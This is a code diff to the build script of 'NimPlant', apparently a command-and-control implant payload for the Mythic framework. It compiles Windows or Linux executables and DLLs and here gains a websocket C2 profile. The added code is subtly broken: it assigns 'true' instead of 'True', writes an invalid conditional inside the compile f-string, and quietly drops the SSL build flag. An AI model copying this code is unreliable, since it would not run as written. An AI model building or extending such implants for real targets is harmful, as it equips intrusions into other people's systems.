@@ -40,7 +40,7 @@ class NimPlant(PayloadType):
                                         description="Use the default proxy on the system, either true or false"),
     }
     #  the names of the c2 profiles that your agent supports
-    c2_profiles = ["HTTP"]
+    c2_profiles = ["HTTP","websocket" ]
 
     async def build(self) -> BuildResponse:
         # this function gets called to create an instance of your payload
@@ -56,12 +56,15 @@ class NimPlant(PayloadType):
             file1 = file1.replace('%DEFAULT_PROXY%', self.get_parameter('default_proxy'))
             profile = None
             is_https = False
+            is_websocket = False
             aespsk_val = ""
             for c2 in self.c2info:
                 profile = c2.get_c2profile()['name']
                 for key, val in c2.get_parameters_dict().items():
                     if 'https' in val:
                         is_https = True
+                    if 'websocket' in val:
+                        is_websocket = true
                     if key == 'AESPSK':
                         # AESPSK is defined so update val as
                         # AESPSK is a compile time defined value
@@ -75,7 +78,7 @@ class NimPlant(PayloadType):
                       if self.get_parameter('format') == 'dll' else '.exe'
 
             # TODO research --passL:-W --passL:-ldl
-            command = f"nim {'c' if self.get_parameter('lang') == 'C' else 'cpp'} {'--os:linux --passL:-W --passL:-ldl' if self.get_parameter('os') == 'linux' else ''} -f --d:mingw {'--d:debug --hints:on --nimcache:' + agent_build_path.name if self.get_parameter('build') == 'debug' else '--d:release --hints:off'} {'--d:AESPSK=' + aespsk_val  if len(aespsk_val) > 2 else ''} --d:ssl --opt:size --passC:-flto --passL:-flto --passL:-s {'--app:lib' if self.get_parameter('format') == 'dll' else ''} {'--embedsrc:on' if self.get_parameter('build') == 'debug' else ''} --cpu:{'amd64' if self.get_parameter('arch') == 'x64' else 'i386'} --out:{self.name}{out_ext} c2/base.nim"
+            command = f"nim {'c' if self.get_parameter('lang') == 'C' else 'cpp'} {'--os:linux --passL:-W --passL:-ldl' if self.get_parameter('os') == 'linux' else ''} -f --d:mingw {'--d:debug --hints:on --nimcache:' + agent_build_path.name if self.get_parameter('build') == 'debug' else '--d:release --hints:off'} {'--d:AESPSK=' + aespsk_val  if len(aespsk_val) > 2 else ''} --opt:size --passC:-flto --passL:-flto --passL:-s {'--app:lib' if self.get_parameter('format') == 'dll' else ''} {'--embedsrc:on' if self.get_parameter('build') == 'debug' else ''} --cpu:{'amd64' if self.get_parameter('arch') == 'x64' else 'i386'} {if is_websocket == '--d:useSockets' else ''} --out:{self.name}{out_ext} c2/base.nim"
             resp.message += f'command: {command} attempting to compile...'
             proc = await asyncio.create_subprocess_shell(command, stdout=asyncio.subprocess.PIPE,
                                     stderr=asyncio.subprocess.PIPE, cwd=agent_build_path.name)
